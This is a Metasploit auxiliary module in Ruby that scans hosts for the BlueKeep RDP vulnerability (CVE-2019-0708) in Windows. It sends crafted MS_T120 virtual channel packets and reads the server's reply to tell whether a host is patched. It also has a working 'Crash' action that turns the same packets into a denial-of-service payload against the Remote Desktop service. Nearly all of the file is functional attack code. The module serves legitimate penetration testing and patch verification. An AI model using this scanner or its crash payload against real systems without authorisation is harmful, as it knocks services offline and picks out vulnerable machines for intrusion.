##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::RDP
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check',
      'Description'    => %q{
        This module checks a range of hosts for the CVE-2019-0708 vulnerability
        by binding the MS_T120 channel outside of its normal slot and sending
        non-DoS packets which respond differently on patched and vulnerable hosts.
        It can optionally trigger the DoS vulnerability.
      },
      'Author'         =>
        [
          'National Cyber Security Centre', # Discovery
          'JaGoTu',                         # Module
          'zerosum0x0',                     # Module
          'Tom Sellers'                     # TLS support, packet documenentation, DoS implementation
        ],
      'References'     =>
        [
          [ 'CVE', '2019-0708' ],
          [ 'URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708' ]
        ],
      'DisclosureDate' => '2019-05-14',
      'License'        => MSF_LICENSE,
      "Actions" => [
        ["Scan", "Description" => "Scan for exploitable targets"],
        ["Crash", "Description" => "Trigger denial of service vulnerability"],
      ],
      "DefaultAction" => "Scan",
      'Notes'          =>
        {
          'Stability' => [ CRASH_SAFE ],
          'AKA'       => ['BlueKeep']
        }
    ))
  end

  def report_goods
    report_vuln(
      :host  => rhost,
      :port  => rport,
      :proto => 'tcp',
      :name  => self.name,
      :info  => 'Behavior indicates a missing Microsoft Windows RDP patch for CVE-2019-0708',
      :refs  => self.references
    )
  end

  def run_host(ip)
    # Allow the run command to call the check command

    status = check_host(ip)
    if status == Exploit::CheckCode::Vulnerable
      print_good(status[1].to_s)
    elsif status == Exploit::CheckCode::Unsupported  # used to display custom msg error
      status = Exploit::CheckCode::Safe
      print_status("The target service is not running or refused our connection.")
    else
      print_status(status[1].to_s)
    end

    status
  end

  def rdp_reachable
    connect
    disconnect
    return true
  rescue Rex::ConnectionRefused
    return false
  rescue Rex::ConnectionTimeout
    return false
  end

  def check_host(_ip)
    # The check command will call this method instead of run_host
    status = Exploit::CheckCode::Unknown

    begin
      begin
        rdp_connect
      rescue ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError
        return Exploit::CheckCode::Unsupported # used to display custom msg error
      end

      status = check_rdp_vuln
    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError, ::TypeError => e
      bt = e.backtrace.join("\n")
      vprint_error("Unexpected error: #{e.message}")
      vprint_line(bt)
      elog("#{e.message}\n#{bt}")
    rescue RdpCommunicationError
      vprint_error("Error communicating RDP protocol.")
      status = Exploit::CheckCode::Unknown
    rescue Errno::ECONNRESET
      vprint_error("Connection reset")
    rescue => e
      bt = e.backtrace.join("\n")
      vprint_error("Unexpected error: #{e.message}")
      vprint_line(bt)
      elog("#{e.message}\n#{bt}")
    ensure
      rdp_disconnect
    end

    status
  end

  def check_for_patch
    begin
      6.times do
        _res = rdp_recv
      end
    rescue RdpCommunicationError
      # we don't care
    end

    # The loop below sends Virtual Channel PDUs (2.2.6.1) that vary in length
    # The arch governs which of the packets triggers the desired response
    # which is an MCS Disconnect Provider Ultimatum or a timeout.

    # Disconnect Provider message of a valid size for each platform
    # has proven to be safe to send as part of the vulnerability check.
    x86_string = "00000000020000000000000000000000"
    x64_string = "0000000000000000020000000000000000000000000000000000000000000000"

    if action.name == 'Crash'
      vprint_status("Sending denial of service payloads")
      # Length and chars are arbitrary but total length needs to be longer than
      # 16 for x86 and 32 for x64. Making the payload too long seems to cause
      # the DoS to fail. Note that sometimes the DoS seems to fail. Increasing
      # the payload size and sending more of them doesn't seem to improve the
      # reliability. It *seems* to happen more often on x64, I haven't seen it
      # fail against x86. Repleated attempts will generally trigger the DoS.
      x86_string += "FF" * 1
      x64_string += "FF" * 2
    else
      vprint_status("Sending patch check payloads")
    end

    # 0x03 = CHANNEL_FLAG_FIRST | CHANNEL_FLAG_LAST
    x86_payload = build_virtual_channel_pdu(0x03, [x86_string].pack("H*"))
    x64_payload = build_virtual_channel_pdu(0x03, [x64_string].pack("H*"))

    6.times do
      # 0xed03 = Channel 1005
      x86_packet = rdp_build_pkt(x86_payload, "\x03\xed")
      rdp_send(x86_packet)
      x64_packet = rdp_build_pkt(x64_payload, "\x03\xed")
      rdp_send(x64_packet)

      # A single pass should be sufficient to cause DoS
      if action.name == 'Crash'
        sleep(1)
        disconnect

        sleep(1)
        if rdp_reachable
          print_error("Target doesn't appear to have been crashed.")
          return Exploit::CheckCode::Unknown
        else
          print_good("Target service appears to have been successfully crashed.")
          return Exploit::CheckCode::Vulnerable
        end
      end

      # Quick check for the Ultimatum PDU
      begin
        res = rdp_recv(-1, 1)
      rescue EOFError
        # we don't care
      end
      return Exploit::CheckCode::Vulnerable if res&.include?(["0300000902f0802180"].pack("H*"))

      # Slow check for Ultimatum PDU. If it doesn't respond in a timely
      # manner then the host is likely patched.
      begin
        4.times do
          res = rdp_recv
          # 0x2180 = MCS Disconnect Provider Ultimatum PDU - 2.2.2.3
          if res.include?(["0300000902f0802180"].pack("H*"))
            return Exploit::CheckCode::Vulnerable
          end
          # vprint_good("#{bin_to_hex(res)}")
        end
      rescue RdpCommunicationError
        # we don't care
      end
    end

    Exploit::CheckCode::Safe
  end

  def check_rdp_vuln
    # check if rdp is open
    is_rdp, server_selected_proto = rdp_check_protocol
    unless is_rdp
      vprint_status "Could not connect to RDP service."
      return Exploit::CheckCode::Unknown
    end

    if [RDPConstants::PROTOCOL_HYBRID, RDPConstants::PROTOCOL_HYBRID_EX].include? server_selected_proto
      vprint_status("Server requires NLA (CredSSP) security which mitigates this vulnerability.")
      return Exploit::CheckCode::Safe
    end

    success = rdp_negotiate_security(server_selected_proto)
    return Exploit::CheckCode::Unknown unless success

    rdp_establish_session

    result = check_for_patch

    if result == Exploit::CheckCode::Vulnerable
      report_goods
    end

    # Can't determine, but at least we know the service is running
    result
  end

end
